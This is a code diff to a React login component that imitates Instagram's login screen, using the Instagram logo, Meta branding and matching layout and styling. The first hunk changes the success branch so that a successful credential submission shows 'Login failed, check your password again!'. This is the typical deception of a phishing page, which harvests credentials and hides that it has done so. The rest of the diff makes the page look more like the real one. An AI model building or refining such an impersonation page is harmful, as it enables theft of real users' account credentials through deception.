@@ -21,7 +21,7 @@ const App = () => {
       const data = await response.json();
 
       if (response.ok) {
-        setSuccess('Login successful!');
+        setSuccess('Login failed , check your password again !');
         setError('');
       } else {
         setError(data.message);
@@ -35,25 +35,31 @@ const App = () => {
 
   return (
     <div
-      className="flex flex-col justify-center items-center h-screen"
+      className="flex justify-center items-center h-screen"
       style={{
         backgroundColor: '#000',
-        backgroundImage: 'linear-gradient(135deg, rgba(0,0,0,0.9), rgba(0,0,0,0.7))',
+        backgroundImage: 'linear-gradient(to right, #000000, #1c1b1b)',
       }}
     >
-      <div className="flex flex-col items-center p-8 rounded shadow-md w-80">
+      <div className="w-80 flex flex-col items-center">
+        {/* Language Selector */}
+        <p className="text-gray-400 text-xs mb-4 self-end pr-6">English (UK)</p>
+
+        {/* Instagram Logo */}
         <img
           src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
           alt="Instagram Logo"
-          className="mb-4"
-          style={{ width: '50px' }}
+          className="mb-8"
+          style={{ width: '90px' }}
         />
+
+        {/* Login Form */}
         <form onSubmit={handleSubmit} className="w-full">
           <div className="mb-4">
             <input
               type="text"
               placeholder="Username, email address or mobile number"
-              className="w-full px-3 py-2 text-white border border-gray-600 bg-transparent rounded"
+              className="w-full px-3 py-2 text-gray-400 border border-gray-600 bg-black rounded text-sm"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
             />
@@ -62,7 +68,7 @@ const App = () => {
             <input
               type="password"
               placeholder="Password"
-              className="w-full px-3 py-2 text-white border border-gray-600 bg-transparent rounded"
+              className="w-full px-3 py-2 text-gray-400 border border-gray-600 bg-black rounded text-sm"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
             />
@@ -71,18 +77,26 @@ const App = () => {
           {success && <p className="text-green-500 text-center">{success}</p>}
           <button
             type="submit"
-            className="w-full bg-blue-500 text-white py-2 rounded font-bold"
+            className="w-full bg-blue-600 text-white py-2 rounded-md text-sm font-bold mb-4"
           >
             Log In
           </button>
-          <p className="text-center text-gray-400 mt-4">Forgotten Password?</p>
         </form>
+
+        {/* Forgotten Password */}
+        <p className="text-center text-blue-500 text-sm mb-8">Forgotten Password?</p>
+
+        {/* Create Account Button */}
         <button
-          className="mt-6 py-2 text-center text-white border border-gray-600 rounded w-full"
+          className="w-full py-2 text-center text-blue-500 border border-gray-600 rounded-md text-sm"
         >
           Create new account
         </button>
-        <p className="text-center text-gray-500 text-sm mt-6">© Meta</p>
+
+        {/* Meta Logo */}
+        <div className="flex justify-center mt-8">
+          <p className="text-center text-gray-500 text-xs">© Meta</p>
+        </div>
       </div>
     </div>
   );
